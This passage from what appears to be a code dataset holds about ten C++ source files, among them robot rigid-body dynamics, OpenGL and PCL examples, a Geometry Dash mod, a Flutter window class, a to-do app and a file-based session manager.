= inertia;\n        _inertia_inv = inertia.inverse();\n    }\n\n    void SingleRigidBodyDynamics::set_feet_data(const std::vector<Vec3d>& feet_ref_positions, const std::vector<Vec3d>& feet_min_bounds, const std::vector<Vec3d>& feet_max_bounds)\n    {\n        assert((_feet_ref_positions.size() == _feet_min_bounds.size() == _feet_max_bounds.size()) && \"Not consistent number of feet!\");\n        _feet_ref_positions = feet_ref_positions;\n        _feet_min_bounds = feet_min_bounds;\n        _feet_max_bounds = feet_max_bounds;\n    }\n\n    void SingleRigidBodyDynamics::set_data(const Vec3d& base_position, const Vec3d& base_velocity, const RotMat& base_orientation, const Vec3d& base_angular_velocity, const std::vector<Vec3d>& feet_positions, const std::vector<size_t>& feet_phases)\n    {\n        // Base-related\n        _base_position = base_position;\n        _base_vel = base_velocity;\n        _base_orientation = base_orientation;\n        _base_angular_vel = base_angular_velocity;\n\n        // Feet-related\n        assert(feet_positions.size() == _feet_ref_positions.size() && feet_phases.size() == _feet_ref_positions.size() && \"Wrong number of feet!\");\n        _feet_positions = feet_positions;\n        _feet_phases = feet_phases;\n    }\n\n    void SingleRigidBodyDynamics::set_base_position(const Vec3d& pos) { _base_position = pos; }\n\n    void SingleRigidBodyDynamics::set_base_velocity(const Vec3d& vel) { _base_vel = vel; }\n\n    void SingleRigidBodyDynamics::set_base_orientation(const RotMat& rot) { _base_orientation = rot; }\n\n    void SingleRigidBodyDynamics::set_base_angular_velocity(const Vec3d& ang_vel) { _base_angular_vel = ang_vel; }\n\n    void SingleRigidBodyDynamics::set_feet_positions(const std::vector<Vec3d>& feet_positions)\n    {\n        assert(feet_positions.size() == _feet_ref_positions.size() && \"Wrong number of feet!\");\n        _feet_positions = feet_positions;\n    }\n\n    void SingleRigidBodyDynamics::set_feet_phases(const std::vector<size_t>& feet_phases)\n    {\n        assert(feet_phases.size() == _feet_ref_positions.size() && \"Wrong number of feet!\");\n        _feet_phases = feet_phases;\n    }\n\n    std::tuple<Matrix, Matrix, Vector> SingleRigidBodyDynamics::linearize() const\n    {\n        const size_t n_dim = 9;\n        const size_t n_feet = _feet_ref_positions.size();\n        const size_t m_dim = n_feet * 3;\n\n        Matrix L_c = skew(_base_angular_vel) * (_inertia - skew(_inertia * _base_angular_vel)); // optimal gain\n        // State Space Model X_n+1 = A*X_n + B*U_n\n        // Define A Matrix\n        Matrix A = Matrix::Zero(n_dim, n_dim);\n        // Block of size (p,q), starting at (i,j)\tmatri_block(i,j,p,q); matri_block<p,q>(i,j);\n        A.block(0, 0, 3, 3) = Matrix::Identity(3, 3);\n        A.block(0, 3, 3, 3) = Matrix::Identity(3, 3) * _dt;\n        A.block(3, 3, 3, 3) = Matrix::Identity(3, 3);\n        A.block(6, 6, 3, 3) = Matrix::Identity(3, 3) - _dt * _inertia_inv * L_c;\n\n        // Define B Matrix\n        Matrix B = Matrix::Zero(n_dim, m_dim);\n        B.block(0, 0, 3, 3 * n_feet) = kron((((0.5 * _",
    "#include \"../include/container_view.h\"\n#include <iostream>\n#include <vector>\n#include <deque>\n#include <list>\n#include <set>\n#include <map>\n#include <unordered_set>\n#include <unordered_map>\n#include <array>\n#include <tuple>\n#include <forward_list>\n\nint main() {\n    // Pair\n    std::pair<int, double> p = {1, 3.14};\n    std::cout << \"Pair: \" << p << std::endl;\n\n    // Tuple\n    std::tuple<int, char, double> t = {1, 'a', 2.3};\n    std::cout << \"Tuple: \" << t << std::endl;\n\n    // Array\n    std::array<int, 3> arr = {1, 2, 3};\n    std::cout << \"Array: \" << arr << std::endl;\n\n    // Deque\n    std::deque<double> dq = {1.1, 2.2, 3.3};\n    std::cout << \"Deque: \" << dq << std::endl;\n\n    // Forward List\n    std::forward_list<int> fl = {1, 2, 3};\n    std::cout << \"Forward List: \" << fl << std::endl;\n\n    // Initializer list (note: we cannot print directly, used only for example)\n    std::initializer_list<int> il = {1, 2, 3};\n\n    // List\n    std::list<int> lst = {1, 2, 3};\n    std::cout << \"List: \" << lst << std::endl;\n\n    // Vector\n    std::vector<std::string> vec = {\"hello\", \"world\"};\n    std::cout << \"Vector: \" << vec << std::endl;\n\n    // Set\n    std::set<std::string> set = {\"apple\", \"banana\", \"cherry\"};\n    std::cout << \"Set: \" << set << std::endl;\n\n    // Multiset\n    std::multiset<int> mset = {4, 5, 4, 1};\n    std::cout << \"Multiset: \" << mset << std::endl;\n\n    // Unordered Set\n    std::unordered_set<int> uset = {4, 5, 6, 7};\n    std::cout << \"Unordered Set: \" << uset << std::endl;\n\n    // Unordered Multiset\n    std::unordered_multiset<int> umset = {4, 5, 6, 6};\n    std::cout << \"Unordered Multiset: \" << umset << std::endl;\n\n    // Map\n    std::map<char, int> map = {{'a', 1}, {'b', 2}};\n    std::cout << \"Map: \" << map << std::endl;\n\n    // Multimap\n    std::multimap<char, int> mmap = {{'a', 1}, {'a', 2}};\n    std::cout << \"Multimap: \" << mmap << std::endl;\n\n    // Unordered Map\n    std::unordered_map<char, int> umap = {{'c', 3}, {'b', 2}};\n    std::cout << \"Unordered Map: \" << umap << std::endl;\n\n    // Unordered Multimap\n    std::unordered_multimap<char, int> ummap = {{'c', 3}, {'c', 4}};\n    std::cout << \"Unordered Multimap: \" << ummap << std::endl;\n\n    return 0;\n}\n",
    "//\n// Created by ivan on 2024/5/3.\n//\n#include <vector>\n#include <glad/glad.h>\n#include <glfw/glfw3.h>\n#include <spdlog/spdlog.h>\n#include <Shader.hpp>\n#include <StbImage.hpp>\n\nconstexpr unsigned int WindowWidth = 800;\nconstexpr unsigned int WindowHeight = 600;\n\nstatic void framebuffer_size_callback(GLFWwindow* window, int width, int height);\nstatic void process_input(GLFWwindow *window);\n\nint main() {\n    spdlog::set_level(spdlog::level::debug);\n\n    glfwInit();\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n#ifdef __APPLE__\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);\n#endif\n\n    GLFWwindow* window = glfwCreateWindow(WindowWidth, WindowHeight, \"Triangle\", nullptr, nullptr);\n    if (!window) {\n        spdlog::error(\"Failed to create GLFW window!\");\n        glfwTerminate();\n        return -1;\n    }\n    glfwMakeContextCurrent(window);\n    glfwSetFramebufferSizeCallback(window, framebuffer_size_callback);\n    if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress)) {\n        spdlog::error(\"Failed to initialize GLAD!\");\n        return -1;\n    }\n\n    lgl::Shader shader;\n    shader.add(lgl::Shader::Type::Vertex, \"./vertexShader.glsl\");\n    shader.add(lgl::Shader::Type::Fragment, \"./fragShader.glsl\");\n    shader.link();\n\n    std::vector<float> vertices{\n        0.5f, 0.5f, 0.0f, 1.0f, 0.0f, 0.0f, 1.0f, 1.0f,\n        0.5f, -0.5f, 0.0f, 0.0f, 1.0f, 0.0f, 1.0f, 0.0f,\n        -0.5f, -0.5f, 0.0f, 0.0f, 0.0f, 1.0f, 0.0f, 0.0f,\n        -0.5f, 0.5f, 0.0f, 1.0f, 1.0f, 0.0f, 0.0f, 1.0f,\n    };\n    std::vector<unsigned int> indices = {\n        0, 1, 3,\n        1, 2, 3,\n    };\n\n    unsigned int vbo, vao, ebo;\n    glGenVertexArrays(1, &vao);\n    glGenBuffers(1, &vbo);\n    glGenBuffers(1, &ebo);\n\n    glBindVertexArray(vao);\n    glBindBuffer(GL_ARRAY_BUFFER, vbo);\n    glBufferData(GL_ARRAY_BUFFER, vertices.size() * sizeof(*vertices.data()), vertices.data(), GL_STATIC_DRAW);\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, ebo);\n    glBufferData(GL_ELEMENT_ARRAY_BUFFER, indices.size() * sizeof(*indices.data()), indices.data(), GL_STATIC_DRAW);\n\n    auto posLoc = shader.get_attribute_location(\"aPos\");\n    glVertexAttribPointer(posLoc, 3, GL_FLOAT, GL_FALSE, 8 * sizeof(*vertices.data()), (void *) 0);\n    glEnableVertexAttribArray(posLoc);\n    auto colorLoc = shader.get_attribute_location(\"aColor\");\n    glVertexAttribPointer(colorLoc, 3, GL_FLOAT, GL_FALSE, 8 * sizeof(*vertices.data()), (void *) (3 * sizeof(*vertices.data())));\n    glEnableVertexAttribArray(colorLoc);\n    auto texCoordLoc = shader.get_attribute_location(\"aTexCoord\");\n    glVertexAttribPointer(texCoordLoc, 2, GL_FLOAT, GL_FALSE, 8 * sizeof(*vertices.data()), (void *) (6 * sizeof(*vertices.data())));\n    glEnableVertexAttribArray(texCoordLoc);\n\n    unsigned int texture1;\n    glGenTextures(1, &texture1);\n    glBindTexture(GL_TEXTURE_2D, texture1);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n    lgl::StbImage image1(\"../assets/container.jpg\");\n    spdlog::info(\"image1: width = {}, height = {}, channel = {}\", image1.width(), image1.height(), image1.channel());\n    if (image1()) {\n        glTexImage2D(GL_TEXTURE_2D, 0, GL_RGB, image1.width(), image1.height(), 0, GL_RGB, GL_UNSIGNED_BYTE, image1());\n        glGenerateMipmap(GL_TEXTURE_2D);\n    } else {\n        spdlog::error(\"Failed to load texture\");\n    }\n    image1.release();\n\n    unsigned int texture2;\n    glGenTextures(1, &texture2);\n    glBindTexture(GL_TEXTURE_2D, texture2);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n    lgl::StbImage image2(\"../assets/awesomeface.png\", true);\n    spdlog::info(\"image2: width = {}, height = {}, channel = {}\", image2.width(), image2.height(), image2.channel());\n    if (image2()) {\n        glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, image2.width(), image2.height(), 0, GL_RGBA, GL_UNSIGNED_BYTE, image2());\n        glGenerateMipmap(GL_TEXTURE_2D);\n    } else {\n        spdlog::error(\"Failed to load texture\");\n    }\n    image2.release();\n\n    shader.use();\n    glUniform1i(shader.get_uniform_location(\"uTexture1\"), 0);\n    glUniform1i(shader.get_uniform_location(\"uTexture2\"), 1);\n\n    while (!glfwWindowShouldClose(window)) {\n        process_input(window);\n\n        glClearColor(0.2f, 0.3f, 0.3f, 1.0f);\n        glClear(GL_COLOR_BUFFER_BIT);\n\n        glActiveTexture(GL_TEXTURE0);\n        glBindTexture(GL_TEXTURE_2D, texture1);\n        glActiveTexture(GL_TEXTURE1);\n        glBindTexture(GL_TEXTURE_2",
    "#include <Geode/Geode.hpp>\n#include <Geode/modify/PlayLayer.hpp>\n\nusing namespace geode::prelude;\n\n// OBJECT IDS | slow = 200 0.7| normal speed = 201, 0.9 | 2x = 202 1.1| 3x = 203 1.3| 4x = 1334 1.6| m_levelString\n\nstd::vector<int> slowSpeed;\nstd::vector<int> normalSpeed;\nstd::vector<int> fastSpeed;\nstd::vector<int> fasterSpeed;\nstd::vector<int> fastestSpeed;\n\nstd::vector<std::string> splitString(const std::string& s, char delimiter) {\n    std::vector<std::string> tokens;\n    std::istringstream ss(s);\n    std::string token;\n    while (std::getline(ss, token, delimiter)) {\n        tokens.push_back(token); \n    }\n    return tokens;\n}\n\nvoid cleanVector(std::vector<int>& vector) {\n\tstd::sort(vector.begin(), vector.end());\n\tauto uniquePositions = std::unique(vector.begin(), vector.end());\n\tvector.erase(uniquePositions, vector.end());\n}\n\nclass $modify(ResetMusicLayer, PlayLayer) {\n\nfloat pitch = 1.0f;\nfloat supposedSpeed;\nbool needingOfPitch = false;\n\n\tbool init(GJGameLevel *level, bool useReplay, bool dontCreateObjects) {\n\t\tbool result = PlayLayer::init(level, useReplay, dontCreateObjects);\n\t\tm_fields->supposedSpeed = 0.0f;\n\t\tauto fmod = FMODAudioEngine::sharedEngine();\n\t\tFMOD_RESULT fResult;\n\t\tFMOD::ChannelGroup* mGroup = nullptr;\n\t\tfResult = fmod->m_system->getMasterChannelGroup(&mGroup);\n\t\tResetMusicLayer::quickRestart();\n\t\tgd::string levelString = m_level->m_levelString;\n\t\tstd::string decompString = ZipUtils::decompressString(levelString, true, 0);\n\t\tstd::vector<std::string> leveldata = splitString(decompString, ';');\n\t\tslowSpeed.clear(); normalSpeed.clear(); fastSpeed.clear(); fasterSpeed.clear(); fastestSpeed.clear(); // real ones use 1 line to save 5\n\n\t\tm_fields->supposedSpeed = 0;\n\t\tif (m_fields->pitch != 1.0f) mGroup->setPitch(1.0f);\n\t\tint pixelBuffer = Mod::get()->getSettingValue<int64_t>(\"pixelBuffer\");\n\n\t\tfor (int i = 0; i < leveldata.size(); i++) {\n\t\t\tif (leveldata[i].substr(0, 6) == \"1,200,\") { \n\t\t\t\t\tstd::vector<std::string> objectXPOS = splitString(leveldata[i], ','); \n\t\t\t\t\tslowSpeed.push_back(stoi(objectXPOS[3]) - pixelBuffer); \n\t\t\t\t}\n\t\t\telse if (leveldata[i].substr(0, 6) == \"1,201,\") { \n\t\t\t\t\tstd::vector<std::string> objectXPOS = splitString(leveldata[i], ','); \n\t\t\t\t\tnormalSpeed.push_back(stoi(objectXPOS[3]) - pixelBuffer);\n\t\t\t\t}\n\t\t\telse if (leveldata[i].substr(0, 6) == \"1,202,\") { \n\t\t\t\t\tstd::vector<std::string> objectXPOS = splitString(leveldata[i], ',');\n\t\t\t\t\tfastSpeed.push_back(stoi(objectXPOS[3]) - pixelBuffer); \n\t\t\t\t}\n\t\t\telse if (leveldata[i].substr(0, 6) == \"1,203,\") { \n\t\t\t\t\tstd::vector<std::string> objectXPOS = splitString(leveldata[i], ',');\n\t\t\t\t\tfasterSpeed.push_back(stoi(objectXPOS[3]) - pixelBuffer); \n\t\t\t\t}\n\t\t\telse if (leveldata[i].substr(0, 7) == \"1,1334,\")  { \n\t\t\t\t\tstd::vector<std::string> objectXPOS = splitString(leveldata[i], ','); \n\t\t\t\t\tfastestSpeed.push_back(stoi(objectXPOS[3]) - pixelBuffer); // 40 is accounted for the start of the hitbox\n\t\t\t\t}\t\n\t\t}\n\t\tcleanVector(slowSpeed); cleanVector(normalSpeed); cleanVector(fastSpeed); cleanVector(fasterSpeed); cleanVector(fastestSpeed);\n\t\tlog::info(\"{} {} {} {} {}\", slowSpeed, normalSpeed, fastSpeed, fasterSpeed, fastestSpeed);\n\t\treturn result;\n\t}\n\n\tvoid postUpdate(float p0) {\n\t\tPlayLayer::postUpdate(p0);\n\t\tauto fmod = FMODAudioEngine::sharedEngine();\n\t\tFMOD_RESULT result;\n\t\tFMOD::ChannelGroup* mGroup = nullptr;\n\t\tresult = fmod->m_system->getMasterChannelGroup(&mGroup);\n\t\tif (m_fields->supposedSpeed == 0.0f) m_fields->supposedSpeed = m_player1->m_playerSpeed; // YEAH BABY INIT WOOO\n\t\tif (m_fields->needingOfPitch) {\n\t\t\tfor (int i = 0; i < slowSpeed.size(); i++) {\n\t\t\t\tif (std::abs(floor(m_player1->getPositionX()) - slowSpeed[i]) <= 5) {\n\t\t\t\t\tlog::debug(\"{} {} 0.7 {}\", floor(m_player1->getPositionX()), m_player1->m_playerSpeed, slowSpeed[i]);\n\t\t\t\t\tm_fields->supposedSpeed = 0.7;\n\t\t\t\t\tm_fields->pitch = m_player1->m_playerSpeed / 0.7;\n\t\t\t\t}\n\t\t\t}\n\t\t\tfor (int i = 0; i < normalSpeed.size(); i++) {\n\t\t\t\tif (std::abs(floor(m_player1->getPositionX()) - normalSpeed[i]) <= 5) {\n\t\t\t\t\tlog::debug(\"{} {} 0.9 {}\", floor(m_player1->getPositionX()), m_player1->m_playerSpeed, normalSpeed[i]);\n\t\t\t\t\tm_fields->supposedSpeed = 0.9;\n\t\t\t\t\tm_fields->pitch = m_player1->m_playerSpeed / 0.9;\n\t\t\t\t}\n\t\t\t}\n\t\t\tfor (int i = 0; i < fastSpeed.size(); i++) {\n\t\t\t\tif (std::abs(floor(m_player1->getPositionX()) - fastSpeed[i]) <= 5) {\n\t\t\t\t\tlog::debug(\"{} {} 1.1 {}\", floor(m_player1->getPositionX()), m_player1->m_playerSpeed, fastSpeed[i]);\n\t\t\t\t\tm_fields->supposedSpeed = 1.1;\n\t\t\t\t\tm_fields->pitch = m_player1->m_playerSpeed / 1.1;\n\t\t\t\t}\n\t\t\t}\n\t\t\tfor (int i = 0; i < fasterSpeed.size(); i++) {\n\t\t\t\tif (std::abs(floor(m_player1->getPositionX()) - fasterSpeed[i]) <= 5) {\n\t\t\t\t\tlog::debug(\"{} {} 1.3 {}\", floor(m_player1->getPositionX()), m_player1->m_playerSpeed, fasterSpeed[i]);\n\t\t\t\t\tm_fields->supposedSpeed = 1.3;\n\t\t\t\t\tm_fields->pitch = m_player1->m_playerSpeed / 1.3;\n\t\t\t\t}\n\t\t\t}\n\t\t\tfor (int i = 0; i < fastestSpeed.size(); i++) {\n\t\t\t\tif (std::abs(floor(m_player1->getPositionX()) - fastestSpeed[",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "//\n//    FILE: unit_test_001.cpp\n//  AUTHOR: Rob Tillaart\n//    DATE: 2023-06-28\n// PURPOSE: unit tests for Smooth library\n//          https://github.com/RobTillaart/SIMON\n//\n\n\n// supported assertions\n// ----------------------------\n// assertEqual(expected, actual);               // a == b\n// assertNotEqual(unwanted, actual);            // a != b\n// assertComparativeEquivalent(expected, actual);    // abs(a - b) == 0 or (!(a > b) && !(a < b))\n// assertComparativeNotEquivalent(unwanted, actual); // abs(a - b) > 0  or ((a > b) || (a < b))\n// assertLess(upperBound, actual);              // a < b\n// assertMore(lowerBound, actual);              // a > b\n// assertLessOrEqual(upperBound, actual);       // a <= b\n// assertMoreOrEqual(lowerBound, actual);       // a >= b\n// assertTrue(actual);\n// assertFalse(actual);\n// assertNull(actual);\n\n// // special cases for floats\n// assertEqualFloat(expected, actual, epsilon);    // fabs(a - b) <= epsilon\n// assertNotEqualFloat(unwanted, actual, epsilon); // fabs(a - b) >= epsilon\n// assertInfinity(actual);                         // isinf(a)\n// assertNotInfinity(actual);                      // !isinf(a)\n// assertNAN(arg);                                 // isnan(a)\n// assertNotNAN(arg);                              // !isnan(a)\n\n\n#include <ArduinoUnitTests.h>\n\n#include \"Arduino.h\"\n#include \"SmartPin.h\"\n\n\nunittest_setup()\n{\n  fprintf(stderr, \"Arduino SmartPin library\\n\");\n}\n\n\nunittest_teardown()\n{\n}\n\n\nunittest(test_constructor)\n{\n  // assertEqual(42, sm.get_window());\n  // assertEqual(0, sm.get_count());\n  // assertEqualFloat(0, sm.get_avg(), 0.0001);\n\n  // Smooth sm0(5, 0, 0);\n  // assertEqual(5, sm0.get_window());\n  // assertEqual(0, sm0.get_count());\n  // assertEqualFloat(0, sm0.get_avg(), 0.0001);\n\n  // Smooth sm1(7, 20);\n  // assertEqual(7, sm1.get_window());\n  // assertEqual(20, sm1.get_count());\n  // assertEqualFloat(0, sm0.get_avg(), 0.0001);\n\n  // Smooth sm2(15, 25, 10);\n  // assertEqual(15, sm2.get_window());\n  // assertEqual(25, sm2.get_count());\n  // assertEqualFloat(10, sm2.get_avg(), 0.0001);\n}\n\n\nunittest_main()\n\n\n//  -- END OF FILE --\n\n",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <string>\n\nvoid showTasks(const std::vector<std::string> &tasks){\n  std::cout << \"To-Do list: \" << std::endl;\n  for (int i = 0; i < tasks.size(); ++i) {\n    std::cout << i + 1 << \". \" << tasks[i] << std::endl; \n  }\n}\n\nint main (){\n  std::vector<std::string> tasks;\n  std::string task;\n  char choice;\n\n  // Load tasklist\n  std::ifstream inputFile(\"tasks.txt\");\n  while (getline(inputFile, task)){\n    tasks.push_back(task);\n  }\n  inputFile.close();\n\n  do{\n    std::cout << \"A - Add a task\" << std::endl;\n    std::cout << \"V - View tasks\" << std::endl;\n    std::cout << \"Q - Quit\" << std::endl;\n    std::cout << \"Enter your choise: \" << std::endl;\n    std::cin >> choice;\n\n    switch (choice) {\n        case 'A':\n        case 'a':\n          std::cout << \"Enter a task: \";\n          std::cin.ignore();\n          getline(std::cin, task);\n          tasks.push_back(task);\n          break;\n        case 'V':\n        case 'v':\n          showTasks(tasks);\n          break;\n    }\n  } while (choice != 'Q' && choice != 'q');\n\n  // Save tasks\n  std::ofstream outputFile(\"tasks.txt\");\n  for (const auto &t : tasks) {\n    outputFile << t << std::endl;\n  }\n  outputFile.close();\n\n  return 0;\n}\n",
    "#include \"info.hpp\"\n\nInfo::Info()\n{\n    this->topRowIndex = 0;\n    this->prevMenuState = GameState::MAIN_MENU;\n\n    parseInfoText();\n}\n\nvoid Info::shiftRow(bool isDown)\n{\n    if (isDown)\n    {\n        if (this->topRowIndex + HEIGHT - 7 < this->rowCount - 1)\n        {\n            this->topRowIndex++;\n        }\n    }\n    else\n    {\n        if (this->topRowIndex > 0)\n        {\n            this->topRowIndex--;\n        }\n    }\n}\n\nvoid Info::render()\n{\n    // Print the info text\n    string text = string(this->infoText);\n    // Skip rows that are not visible\n    for (int i = 0; i < this->topRowIndex; i++)\n    {\n        text = text.substr(text.find(\"\\n\") + 1);\n    }\n\n    for (int i = 2; i < HEIGHT - 3; i++)\n    {\n        // Print the text\n        int newLineIndex = text.find(\"\\n\");\n        string line = text.substr(0, newLineIndex);\n        monoColorPrint(ColorPair::BLUE, i, 2, line);\n        text = text.substr(newLineIndex + 1);\n    }\n}\n\nGameState Info::getPrevMenuState()\n{\n    return this->prevMenuState;\n}\n\nvoid Info::setPrevMenuState(GameState state)\n{\n    this->prevMenuState = state;\n}\n\nvoid Info::parseInfoText()\n{\n    // Count the number of rows\n    this->rowCount = 0;\n    this->infoText = \"\";\n\n    addSectionText(0);\n    addHorizontalDelimiter();\n    addSectionText(1);\n    addHorizontalDelimiter();\n    addSectionText(2);\n\n    // Remove the last newline character\n    this->infoText = this->infoText.substr(0, this->infoText.length() - 1);\n    this->rowCount--;\n}\n\nvoid Info::addSectionText(int sectionIndex)\n{\n    for (int i = 0; i < SECTION_LENGTH[sectionIndex]; i++)\n    {\n        string text = (sectionIndex == 0) ? TUTORIAL[i] : (sectionIndex == 1) ? CONTROLS[i] : ABOUT[i];\n\n        // For Header we center it\n        if (i == 0 || sectionIndex == 2)\n        {\n            // Center the text\n            int padding = (MAX_INFO_WIDTH - text.length()) / 2;\n            for (int j = 0; j < padding; j++)\n            {\n                this->infoText += \" \";\n            }\n            this->infoText += string(text) + \"\\n\";\n            this->rowCount++;\n            \n            if (i == 0)\n            {\n                this->infoText += \"\\n\";\n                this->rowCount++;\n            }\n            continue;\n        }\n\n        // Split the text into multiple lines if it exceeds the width\n        for (size_t j = 0; j < text.length(); j += MAX_INFO_WIDTH)\n        {\n            this->infoText += string(text.substr(j, MAX_INFO_WIDTH)) + \"\\n\";\n            this->rowCount++;\n        }\n    }\n}\n\nvoid Info::addHorizontalDelimiter()\n{\n    this->infoText += \"\\n\";\n    for (int i = 0; i < MAX_INFO_WIDTH; i++)\n    {\n        this->infoText += \"*\";\n    }\n    this->infoText += \"\\n\\n\";\n    this->rowCount += 3;\n}",
    "#include \"auth/session.h\"\n#include \"auth/login_manager.h\"\n#include \"utils/exceptions.h\"\n#include <cassert>\n#include <ctime>\n#include <filesystem>\n#include <fstream>\n#include <iostream>\n#include <memory>\n#include <string>\nnamespace auth {\nsession::session () : _user (nullptr) {\n    generate_directory ();\n}\n\nsession::session (std::shared_ptr<user> user, time_t time)\n: _user (user), _time (time) {\n    generate_directory ();\n}\n\nstd::string session::generate_path (std::string id) {\n    return std::filesystem::current_path ().string () + \"/\" +\n    _sessions_directory + \"/\" + id + \".txt\";\n}\n\nbool session::search_sessions (std::string target_user_id, session* target_session) {\n    std::string path = generate_path (target_user_id);\n    if (!std::filesystem::exists (path))\n        return false;\n    std::ifstream infile (path);\n\n    std::string user_id, role_string;\n    time_t time;\n    getline (infile, user_id);\n    getline (infile, role_string);\n    infile >> time;\n\n\n    user::Role role = user::string_to_role (role_string);\n\n    std::shared_ptr<user> user = login_manager::get_instance ().load_user (user_id, role);\n\n    *target_session = session (user, time);\n\n    infile.close ();\n    return true;\n}\n\n\nbool session::is_saved () const {\n    auto path = generate_path (_user->get_id ());\n    try {\n        for (const std::filesystem::directory_entry& x : std::filesystem::directory_iterator{\n             std::filesystem::current_path ().string () + \"/\" + _sessions_directory })\n            if (x.path () == path) {\n                return true;\n            }\n    } catch (const std::filesystem::filesystem_error& ex) {\n        std::cerr << ex.what () << '\\n';\n        return false;\n    }\n    return false;\n}\nbool session::has_expired () const {\n    return difftime (time (NULL), _time) > 24 * 60 * 60;\n}\nvoid session::save_session () {\n    if (!valid_session ())\n        throw utils::custom_exception{ \"The session is invalid\" };\n    _time            = time (NULL);\n    std::string path = generate_path (_user->get_id ());\n\n    std::ofstream outfile;\n\n    outfile.open (path);\n    assert (std::filesystem::exists (path));\n\n    outfile << _user->get_id () << std::endl;\n    outfile << user::role_to_string (_user->get_role ()) << std::endl;\n    outfile << _time << std::endl;\n\n    outfile.close ();\n}\n\nvoid session::update_session_time_to_now () {\n}\nvoid session::generate_directory () {\n    std::string dir_path = get_directory ();\n    if (!std::filesystem::exists (dir_path))\n        std::filesystem::create_directory (dir_path);\n}\n\nstd::string session::get_directory () {\n    return std::filesystem::current_path ().string () + \"/\" + _sessions_directory;\n}\n} // namespace auth\n",
    "//./moment_of_inertia lamppost.pcd\n//https://pcl.readthedocs.io/projects/tutorials/en/master/moment_of_inertia.html#moment-of-inertia\n#include <vector>\n#include <thread>\n\n#include <pcl/features/moment_of_inertia_estimation.h>\n#include <pcl/io/pcd_io.h>\n#include <pcl/point_types.h>\n#include <pcl/visualization/cloud_viewer.h>\n\nusing namespace std::chrono_literals;\n\nint main (int argc, char** argv)\n{\n  if (argc != 2)\n    return (0);\n\n  pcl::PointCloud<pcl::PointXYZ>::Ptr cloud (new pcl::PointCloud<pcl::PointXYZ> ());\n  if (pcl::io::loadPCDFile (argv[1], *cloud) == -1)\n    return (-1);\n\n  pcl::MomentOfInertiaEstimation <pcl::PointXYZ> feature_extractor;\n  feature_extractor.setInputCloud (cloud);\n  feature_extractor.compute ();\n\n  std::vector <float> moment_of_inertia;\n  std::vector <float> eccentricity;\n  pcl::PointXYZ min_point_AABB;\n  pcl::PointXYZ max_point_AABB;\n  pcl::PointXYZ min_point_OBB;\n  pcl::PointXYZ max_point_OBB;\n  pcl::PointXYZ position_OBB;\n  Eigen::Matrix3f rotational_matrix_OBB;\n  float major_value, middle_value, minor_value;\n  Eigen::Vector3f major_vector, middle_vector, minor_vector;\n  Eigen::Vector3f mass_center;\n\n  feature_extractor.getMomentOfInertia (moment_of_inertia);\n  feature_extractor.getEccentricity (eccentricity);\n  feature_extractor.getAABB (min_point_AABB, max_point_AABB);\n  feature_extractor.getOBB (min_point_OBB, max_point_OBB, position_OBB, rotational_matrix_OBB);\n  feature_extractor.getEigenValues (major_value, middle_value, minor_value);\n  feature_extractor.getEigenVectors (major_vector, middle_vector, minor_vector);\n  feature_extractor.getMassCenter (mass_center);\n\n  pcl::visualization::PCLVisualizer::Ptr viewer (new pcl::visualization::PCLVisualizer (\"3D Viewer\"));\n  viewer->setBackgroundColor (0, 0, 0);\n  viewer->addCoordinateSystem (1.0);\n  viewer->initCameraParameters ();\n  viewer->addPointCloud<pcl::PointXYZ> (cloud, \"sample 